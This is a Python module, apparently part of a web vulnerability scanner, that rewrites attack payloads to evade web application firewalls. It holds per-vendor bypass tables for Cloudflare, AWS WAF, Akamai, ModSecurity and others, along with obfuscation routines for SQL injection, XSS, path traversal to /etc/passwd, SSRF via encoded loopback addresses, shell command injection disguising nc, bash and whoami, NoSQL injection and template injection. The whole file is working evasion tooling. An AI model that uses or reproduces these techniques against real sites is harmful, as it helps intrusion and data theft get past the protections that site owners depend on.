import re
import random
import socket
import struct
import string
from urllib.parse import quote

WAF_STRATEGIES = {
    'Cloudflare': {
        'sqli_space': ["/*+*/", "%0A", "%09", "+", "%20"], 
        'sqli_keywords': 'case_toggle', 
        'xss_tags': 'newline_insertion', 
        'cmdi_space': 'ifs', 
        'lfi_encoding': 'double_url'
    },
    'AWS WAF': {
        'sqli_space': ["%09", "%0A", "+", "%0C"], 
        'sqli_keywords': 'case_toggle',
        'xss_tags': 'html_entities', 
        'cmdi_space': 'redirect', 
        'lfi_encoding': 'nested'
    },
    'Azure WAF (App Gateway)': {
        'sqli_space': ["/**/", "%0A", "%0D"],
        'sqli_keywords': 'comment_split', 
        'xss_tags': 'junk_attributes', 
        'lfi_encoding': 'utf8_overflow'
    },
    'Akamai': {
        'sqli_space': ["%09", "+"],
        'sqli_keywords': 'concat', 
        'xss_tags': 'random_case',
        'lfi_slashes': 'double_slash'
    },
    'Sucuri': {
        'sqli_space': ["%20", "/**/"],
        'sqli_keywords': 'versioned', 
        'xss_tags': 'unicode_escape', 
        'lfi_encoding': 'url_encode'
    },
    'ModSecurity (OWASP CRS)': {
        'sqli_space': ["/*!50000*/", "/**/", "%0B"], 
        'sqli_keywords': 'comment_split',
        'xss_tags': 'double_encode',
        'lfi_encoding': 'utf8_overflow'
    },
    'F5 BIG-IP ASM': {
        'sqli_space': ["%20", "+"],
        'sqli_keywords': 'hex_encode', 
        'xss_tags': 'junk_attributes',
        'lfi_slashes': 'path_truncation'
    },
    'Citrix NetScaler': {
        'sqli_space': ["%0A", "%0D", "%00"], 
        'sqli_keywords': 'case_toggle',
        'xss_tags': 'html_entities',
        'lfi_encoding': 'double_url'
    },
    'Barracuda': {
        'sqli_space': ["/**/", "+"],
        'sqli_keywords': 'comment_split',
        'xss_tags': 'random_case',
        'lfi_encoding': 'nested'
    },
    'Palo Alto (Prisma)': {
        'sqli_space': ["%20", "%09"],
        'sqli_keywords': 'concat', 
        'xss_tags': 'whitespace', 
        'cmdi_space': 'tab'
    },
    'Fortinet (FortiWeb)': {
        'sqli_space': ["%09", "+"],
        'sqli_keywords': 'hex_encode',
        'xss_tags': 'junk_attributes',
        'lfi_encoding': 'double_slash'
    },
    'Wordfence': { 
        'sqli_space': ["/*!*/", "%0A"],
        'sqli_keywords': 'versioned',
        'xss_tags': 'double_encode',
        'lfi_encoding': 'nested'
    },

    'Default': {
        'sqli_space': ["/**/", "+", "%09", "%0A", "%0C", "%0B"],
        'sqli_keywords': 'random', 
        'xss_tags': 'random',
        'cmdi_space': 'random',
        'lfi_encoding': 'random'
    }
}

def get_strategy(waf_name):
    if not waf_name: return WAF_STRATEGIES['Default']
    for key in WAF_STRATEGIES:
        if key.lower() in waf_name.lower(): return WAF_STRATEGIES[key]
    return WAF_STRATEGIES['Default']

def random_case(s):
    return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in s)

def url_encode_recursive(payload, level=1):
    res = payload
    for _ in range(level):
        res = quote(res, safe='')
    return res

def to_hex(s):
    return "0x" + s.encode().hex()

def insert_junk(s, chars=" \t\n\r"):
    res = ""
    for c in s:
        res += c + (random.choice(chars) if random.random() > 0.7 else "")
    return res

def path_obfuscate(payload):
    res = payload
    
    if "../" in res:
        res = res.replace("/", "%5c").replace(".", "%2e") 
    
    if "<" in res:
        res = res.replace("<", "%253c%0a").replace(">", "%253e%0a") 
        
    return res

def sql_obfuscate(payload, strategy):
    spaces = strategy.get('sqli_space', ["/**/", "+", "%09", "%0A", "%0C", "%0D", "/*+*/"])
    chosen_space = random.choice(spaces)
    payload = payload.replace(" ", chosen_space)

    keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'ORDER', 'GROUP', 'SLEEP', 'BENCHMARK', 'WAITFOR', 'DELAY']
    tech = strategy.get('sqli_keywords', 'random')
    
    if tech == 'random':
        tech = random.choice(['case_toggle', 'comment_split', 'versioned', 'concat', 'hex_encode'])

    for kw in keywords:
        if kw in payload.upper():
            if tech == 'case_toggle':
                payload = re.sub(kw, random_case(kw), payload, flags=re.IGNORECASE)
            elif tech == 'comment_split':
                mid = random.randint(1, len(kw)-1)
                obf_kw = kw[:mid] + "/**/" + kw[mid:]
                payload = re.sub(kw, obf_kw, payload, flags=re.IGNORECASE)
            elif tech == 'versioned': 
                obf_kw = f"/*!50000{random_case(kw)}*/"
                payload = re.sub(kw, obf_kw, payload, flags=re.IGNORECASE)
            elif tech == 'concat':
                mid = len(kw) // 2
                if random.choice([True, False]):
                    obf_kw = f"CONCAT('{kw[:mid]}','{kw[mid:]}')"
                else:
                    obf_kw = f"'{kw[:mid]}'||'{kw[mid:]}'"
                payload = re.sub(kw, obf_kw, payload, flags=re.IGNORECASE)

    if "'" in payload and tech == 'hex_encode':
        def hex_replacer(match):
            return to_hex(match.group(1))
        payload = re.sub(r"'(\w+)'", hex_replacer, payload)

    payload = re.sub(r'\sOR\s', '||', payload, flags=re.IGNORECASE)
    payload = re.sub(r'\sAND\s', '&&', payload, flags=re.IGNORECASE) # MySQL

    return payload

def xss_obfuscate(payload, strategy):
    tech = strategy.get('xss_tags', 'random')
    if tech == 'random': tech = random.choice(['case', 'newline', 'html', 'unicode', 'junk'])

    if tech == 'newline':
        payload = re.sub(r'<([a-z]+)', lambda m: '<' + m.group(1)[:1] + '%0A' + m.group(1)[1:], payload, flags=re.IGNORECASE)
    elif tech == 'html':
        payload = payload.replace("<", "&lt;").replace(">", "&gt;")
    elif tech == 'unicode':
        payload = payload.replace("<", "\\u003c").replace(">", "\\u003e")
    elif tech == 'junk':
        payload = re.sub(r'<([a-z]+)>', r'<\1/ \t>', payload, flags=re.IGNORECASE)
    else:
        payload = re.sub(r'<([a-z]+)', lambda m: '<' + random_case(m.group(1)), payload, flags=re.IGNORECASE)

    payload = payload.replace("=", random.choice(["=", "\t=", "%09=", " = ", "%0A="]))
    
    if "alert" in payload:
        subs = ["alert", "window['alert']", "self['alert']", "top['alert']", "\\u0061lert"]
        payload = payload.replace("alert", random.choice(subs))
    
    if "(" in payload:
        payload = payload.replace("(", random.choice(["(", "&#40;", "%28"]))
        payload = payload.replace(")", random.choice([")", "&#41;", "%29"]))
    
    payload = payload.replace("'", "\\u0027").replace('"', "\\u0022")
    
    if '<' in payload and '>' in payload:
        payload = payload.replace("<", "&#x3c;")
        payload = payload.replace(">", "&#x3e;")
        
    return payload


def lfi_obfuscate(payload, strategy):
    tech = strategy.get('lfi_encoding', 'random')
    if tech == 'random': tech = random.choice(['double', 'utf8', 'nested', 'null', 'truncate', 'simple_url']) 

    if "/" not in payload: 
        if tech == 'null':
            return payload + "%00"
        return payload

    if tech == 'nested':
        payload = payload.replace("../", "....//")
        payload = payload.replace("..\\", "....\\\\")
    elif tech == 'double':
        payload = payload.replace("/", "%252f").replace("\\", "%255c")
        payload = payload.replace(".", "%252e")
    elif tech == 'utf8':
        payload = payload.replace("/", "%c0%af")
        payload = payload.replace(".", "%c0%ae")
    elif tech == 'simple_url':
        payload = payload.replace("/", "%2f").replace(".", "%2e")
    
    if tech == 'truncate':
        payload = payload + "." * 200
    elif tech == 'null':
        if "%00" not in payload: payload += "%00"

    payload = re.sub(r'/', '/' * random.randint(2, 4), payload)
    
    if "/etc/passwd" in payload and "php://" not in payload:
        if random.choice([True, False]):
            payload = payload.replace("/etc/passwd", "php://filter/resource=/etc/passwd")
    
    return payload

def ip_to_dword(ip):
    try:
        packed = socket.inet_aton(ip)
        return struct.unpack("!L", packed)[0]
    except: return ip

def ssrf_obfuscate(payload, strategy=None):
    if "wafmap-callback.test" in payload:
        return payload
    
    ip_match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', payload)
    if ip_match:
        ip = ip_match.group(1)
        mode = random.choice(['decimal', 'octal', 'hex', 'dotted_hex'])
        
        if mode == 'decimal':
            new_ip = str(ip_to_dword(ip))
        elif mode == 'octal':
            new_ip = '.'.join([format(int(x), '04o') for x in ip.split('.')])
        elif mode == 'hex':
            new_ip = hex(ip_to_dword(ip))
        else: 
            new_ip = '.'.join([hex(int(x)) for x in ip.split('.')])

        payload = payload.replace(ip, new_ip)
    
    if "http://" in payload:
        payload = re.sub(r'http://', 'hTTp://', payload, flags=re.IGNORECASE)
        payload = payload.replace("://", "://0@")
    
    shortcuts = ["[::]", "0.0.0.0", "0", "127.1", "localtest.me"]
    payload = payload.replace("localhost", random.choice(shortcuts))
    
    return payload

def cmdi_obfuscate(payload, strategy=None):
    if "wafmap-callback.test" in payload:
        return payload
        
    is_windows = "\\" in payload or "type" in payload.lower() or "ping" in payload and "-n" in payload
    
    if is_windows:       
        res = ""
        for char in payload:
            if char == " ":
                res += char
            elif random.choice([True, False]): 
                res += "^" + char
            else:
                res += char
        payload = res
        
        payload = random_case(payload)

    else:
        if " " in payload:
            replacements = ["${IFS}", "$IFS$9", "\t", "<", "%09"]
            
            if "cat " in payload or "head " in payload:
                 payload = payload.replace(" ", random.choice(["<", "${IFS}"]))
            else:
                 payload = payload.replace(" ", random.choice(replacements))

        keywords = ['cat', 'whoami', 'id', 'ls', 'ping', 'nc', 'python', 'bash', 'sh', 'uname', 'echo']
        for kw in keywords:
            if kw in payload:
                technique = random.choice(['quotes', 'backslash', 'empty_var', 'concat'])
                
                if technique == 'quotes':
                    q = random.choice(["'", '"'])
                    if len(kw) > 1:
                        split_idx = random.randint(1, len(kw)-1)
                        obf_kw = kw[:split_idx] + q + q + kw[split_idx:]
                        payload = payload.replace(kw, obf_kw)
                    
                elif technique == 'backslash':
                    if len(kw) > 1:
                        split_idx = random.randint(0, len(kw)-1)
                        obf_kw = kw[:split_idx] + "\\" + kw[split_idx:]
                        payload = payload.replace(kw, obf_kw)
                    
                elif technique == 'empty_var':
                    empty = random.choice(["$@", "$*", "${}"])
                    if len(kw) > 1:
                        split_idx = random.randint(1, len(kw)-1)
                        obf_kw = kw[:split_idx] + empty + kw[split_idx:]
                        payload = payload.replace(kw, obf_kw)
                    
                elif technique == 'concat':
                    obf_kw = ""
                    for c in kw:
                        obf_kw += f"'{c}'"
                    payload = payload.replace(kw, obf_kw)

        if payload in ['id', 'whoami', 'ls', 'pwd']:
            if random.choice([True, False]):
                payload = f"$({payload})" # $(id)
            else:
                payload = f"`{payload}`"   # `id`
        
        if "/" in payload:
             def glob_replace(match):
                 s = match.group(0)
                 if len(s) <= 2: return s
                 chars = list(s)
                 for i in range(len(chars)):
                     if chars[i].isalnum() and random.random() > 0.7:
                         chars[i] = '?'
                 return "".join(chars)
                 
             payload = re.sub(r'/[a-zA-Z0-9._-]+', glob_replace, payload)

    return payload

def nosqli_obfuscate(payload, strategy=None):
    if "||" in payload: payload = payload.replace("||", "/*a*/||/*b*/")
    if "==" in payload: payload = payload.replace("==", "/*a*/==/*b*/")
    
    if "{" in payload:
        payload = payload.replace(":", " : ").replace("{", "{ ").replace(",", ", ")
        
    if "$ne" in payload: payload = payload.replace("$ne", "\\u0024ne")
    if "$gt" in payload: payload = payload.replace("$gt", "\\u0024gt")
    if "$where" in payload: payload = payload.replace("$where", "\\u0024where")
    
    return payload

def ssti_obfuscate(payload, strategy=None):
    payload = payload.replace("{{", "{{ ").replace("}}", " }}")
    
    if "class" in payload:
        payload = payload.replace("class", "'cla'+'ss'")
    if "config" in payload:
        payload = payload.replace("config", "'con'+'fig'")
    
    return payload

def apply_tampering(payload, vtype, enabled, waf_name=None):
    if not enabled:
        return payload

    strategy = get_strategy(waf_name)
    
    res = payload
    if vtype == 'sqli': res = sql_obfuscate(res, strategy)
    elif vtype == 'xss': res = xss_obfuscate(res, strategy)
    elif vtype == 'lfi': res = lfi_obfuscate(res, strategy)
    elif vtype == 'ssrf': res = ssrf_obfuscate(res, strategy)
    elif vtype == 'ssti': res = ssti_obfuscate(res, strategy)
    elif vtype == 'cmdi': res = cmdi_obfuscate(res, strategy)
    elif vtype == 'nosqli': res = nosqli_obfuscate(res, strategy)

    if vtype in ['lfi', 'xss', 'ssrf']:
        res = path_obfuscate(res) 
    
    if vtype != 'lfi':
        return url_encode_recursive(res, level=1)
    return res
